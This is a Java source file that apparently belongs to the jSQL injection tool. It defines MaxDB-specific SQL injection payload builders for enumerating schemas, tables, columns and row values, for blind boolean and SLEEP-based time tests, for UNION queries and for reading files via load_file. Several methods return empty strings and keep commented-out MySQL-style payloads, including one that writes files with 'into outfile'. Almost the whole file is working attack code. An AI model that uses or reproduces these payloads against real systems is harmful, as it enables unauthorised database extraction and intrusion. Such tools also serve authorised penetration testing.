package com.jsql.model.vendor;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import com.jsql.model.bean.Database;
import com.jsql.model.bean.Table;
import com.jsql.model.blind.ConcreteTimeInjection;
import com.jsql.model.injection.MediatorModel;
import com.jsql.tool.ToolsString;

public class MaxDbStrategy implements ISQLStrategy {

    @Override
    public String getSchemaInfos() {
        return
            "SELECT+replace(hex('MaxDB+(SAP+DB)+'||id||'{%}'||DATABASE()||'{%}'||user()||'{%}'||'%3F'),'00','')||'i'r+from+sysinfo.VERSION";
    }

    @Override
    public String getSchemaList() {
        return
            "select+rr||'i'r+from(select+'hh'||replace(hex(trim(t.schemaname)),'00','')||'jj30hh'rr,count(*)c+" +
            "from(select+distinct+schemaname+from+SCHEMAS)t,(select+distinct+schemaname+from+SCHEMAS)t1+" +
            "where+t.schemaname>=t1.schemaname+" +
            "group+by+t.schemaname{limit})a,(select+count(distinct+schemaname)nb+from+SCHEMAS)y";
    }

    @Override
    public String getTableList(Database database) {
        return
            "select+rr||'i'r+from(select+'hh'||replace(hex(trim(t.tablename)),'00','')||'jj30hh'rr,count(*)c+" +
            "from(select+distinct+tablename+from+TABLES+where+SCHEMANAME='" + database + "')t,(select+distinct+tablename+from+TABLES+where+SCHEMANAME='" + database + "')t1+" +
            "where+t.tablename>=t1.tablename+" +
            "group+by+t.tablename{limit})a,(select+count(distinct+tablename)nb+from+TABLES+where+SCHEMANAME='" + database + "')y";
    }

    @Override
    public String getColumnList(Table table) {
        return
            "select+rr||'i'r+from(select+'hh'||replace(hex(trim(t.COLUMNNAME)),'00','')||'jj30hh'rr,count(*)c+" +
            "from(select+distinct+COLUMNNAME+from+COLUMNS+where+SCHEMANAME='" + table.getParent() + "'and+TABLENAME='" + table + "')t,(select+distinct+COLUMNNAME+from+COLUMNS+where+SCHEMANAME='" + table.getParent() + "'and+TABLENAME='" + table + "')t1+" +
            "where+t.COLUMNNAME>=t1.COLUMNNAME+" +
            "group+by+t.COLUMNNAME{limit})a,(select+count(distinct+COLUMNNAME)nb+from+COLUMNS+where+SCHEMANAME='" + table.getParent() + "'and+TABLENAME='" + table + "')y";
    }

    @Override
    public String getValues(String[] columns, Database database, Table table) {
        String formatListColumn = ToolsString.join(columns, "{%}");
        
        // 7f caractère d'effacement, dernier code hexa supporté par mysql, donne 3f=>? à partir de 80
        formatListColumn = formatListColumn.replace("{%}", "),''))||'%7F'||trim(ifnull(chr(");
        formatListColumn = "trim(ifnull(chr(" + formatListColumn + "),''))";
        
        return
            "select+rr||'i'r+from(select+'hh'||replace(hex(trim(t.s)),'00','')||'jj30hh'rr,count(*)c+" +
            "from(select+distinct+" + formatListColumn + "s+from+" + database + "." + table + ")t,(select+distinct+" + formatListColumn + "s+from+" + database + "." + table + ")t1+" +
            "where+t.s>=t1.s+" +
            "group+by+t.s{limit})a,(select+count(distinct+" + formatListColumn + ")nb+from+" + database + "." + table + ")y";
    }

    @Override
    public String getPrivilege() {
        return "";
//            "concat(" +
//                "(" +
//                    "select+" +
//                        "hex(" +
//                            "if(count(*)=1,0x" + ToolsString.strhex("true") + ",0x" + ToolsString.strhex("false") + ")" +
//                        ")" +
//                    "from+INFORMATION_SCHEMA.USER_PRIVILEGES+" +
//                    "where+" +
//                        "grantee=concat(0x27,replace(cast(current_user+as+char),0x40,0x274027),0x27)" +
//                        "and+PRIVILEGE_TYPE=0x46494c45" +
//                ")," +
//                "0x69" +
//            ")";
    }

    @Override
    public String readTextFile(String filePath) {
        return "concat(hex(load_file(0x" + ToolsString.strhex(filePath) + ")),0x69)";
    }

    @Override
    public String writeTextFile(String content, String filePath) {
        return  "";
//            MediatorModel.model().initialQuery
//                .replaceAll(
//                    "1337" + MediatorModel.model().visibleIndex + "7331",
//                    "(select+0x" + ToolsString.strhex(content) + ")"
//                )
//                .replaceAll("--++", "")
//                + "+into+outfile+\"" + filePath + "\"--+";
    }

    @Override
    public String[] getListFalseTest() {
        return new String[]{"true=false", "true%21=true", "false%21=false", "1=2", "1%21=1", "2%21=2"};
    }

    @Override
    public String[] getListTrueTest() {
        return new String[]{"true=true", "false=false", "true%21=false", "1=1", "2=2", "1%21=2"};
    }

    @Override
    public String getBlindFirstTest() {
        return "0%2b1=1";
    }

    @Override
    public String blindCheck(String check) {
        return "+and+" + check + "--+";
    }

    @Override
    public String blindBitTest(String inj, int indexCharacter, int bit) {
        return "+and+ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + "--+";
    }

    @Override
    public String blindLengthTest(String inj, int indexCharacter) {
        return "+and+char_length(" + inj + ")>" + indexCharacter + "--+";
    }

    @Override
    public String timeCheck(String check) {
        return "+and+if(" + check + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
    }

    @Override
    public String timeBitTest(String inj, int indexCharacter, int bit) {
        return "+and+if(ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
    }

    @Override
    public String timeLengthTest(String inj, int indexCharacter) {
        return "+and+if(char_length(" + inj + ")>" + indexCharacter + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
    }

    @Override
    public String blindStrategy(String sqlQuery, String startPosition) {
        return  "";
//            "(" +
//                "select+" +
//                "concat(" +
//                    "0x53514c69," +
//                    "mid(" +
//                        "(" + sqlQuery + ")," +
//                        startPosition + "," +
//                        "65536" +
//                    ")" +
//                ")" +
//            ")";
    }

    @Override
    public String getErrorBasedStrategyCheck() {
        return  "";
//            "+and(" +
//                "select+1+" +
//                "from(" +
//                    "select+" +
//                        "count(*)," +
//                        "floor(rand(0)*2)" +
//                    "from+" +
//                        "information_schema.tables+" +
//                    "group+by+2" +
//                ")a" +
//            ")--+";
    }

    @Override
    public String errorBasedStrategy(String sqlQuery, String startPosition) {
        return  "";
//            "+and" +
//                "(" +
//                "select+" +
//                    "1+" +
//                "from(" +
//                    "select+" +
//                        "count(*)," +
//                        "concat(" +
//                            "0x53514c69," +
//                            "mid(" +
//                                "(" + sqlQuery + ")," +
//                                startPosition + "," +
//                                "64" +
//                            ")," +
//                        "floor(rand(0)*2)" +
//                    ")" +
//                    "from+information_schema.tables+" +
//                    "group+by+2" +
//                ")a" +
//            ")--+";
    }

    @Override
    public String normalStrategy(String sqlQuery, String startPosition) {
        return 
            "select+'SQLi'||SUBSTR(r," + startPosition + ",1500)from(" + sqlQuery + ")x";
    }

    @Override
    public String timeStrategy(String sqlQuery, String startPosition) {
        return "";
//            "(" +
//                "select+" +
//                    "concat(" +
//                        "0x53514c69," +
//                        "mid(" +
//                            "(" + sqlQuery + ")," +
//                            startPosition + "," +
//                            "65536" +
//                        ")" +
//                    ")" +
//            ")";
    }

    @Override
    public String performanceQuery(String[] indexes) {
        return 
            MediatorModel.model().initialQuery.replaceAll(
                "1337(" + ToolsString.join(indexes, "|") + ")7331",
                "(select'SQLi'||rpad('#',1024,'#')||'iLQS'from+dual)"
            );
    }

    @Override
    public String initialQuery(Integer nbFields) {
        String replaceTag = "";
        List<String> fields = new ArrayList<String>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("*");
            replaceTag = "select(1337"+ i +"7330%2b1)y+from+dual";
        }
        return "+union+select+" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "+from(" + replaceTag + ")z+";
    }

    @Override
    public String insertionCharacterQuery() {
        return "+order+by+1337--+";
    }

    @Override
    public String getLimit(Integer limitSQLResult) {
        return "+having+count(*)+between+" + (limitSQLResult+1) + "+and+" + (limitSQLResult+1);
    }
}